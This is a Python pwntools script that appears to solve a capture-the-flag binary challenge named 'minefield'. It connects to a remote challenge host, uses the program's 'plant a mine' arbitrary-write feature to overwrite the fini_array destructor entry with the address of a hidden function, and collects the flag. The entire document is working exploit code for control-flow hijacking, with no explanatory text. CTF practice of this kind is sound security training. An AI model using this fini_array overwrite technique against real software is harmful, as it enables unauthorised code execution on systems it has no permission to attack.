from pwn import *

elf = ELF("./challenge/minefield")

conn = remote('138.68.177.159', 32288)

with log.progress("retrieving flag") as progress:
    progress.status("choose to plant a mine");
    conn.recvlines(3)
    conn.sendline('2')

    progress.status("choose where to plant the mine")
    conn.recvuntil("Insert type of mine: ")
    conn.sendline('0x%x' % elf.symbols["__do_global_dtors_aux_fini_array_entry"])

    progress.status("choose what value to set the mine")
    conn.recvuntil("Insert location to plant: ")
    conn.sendline('0x%x' % elf.symbols["_"])

    progress.status("run for the flag")
    conn.recvline_startswith(b"Mission accomplished!")
    log.success(conn.recvallS())
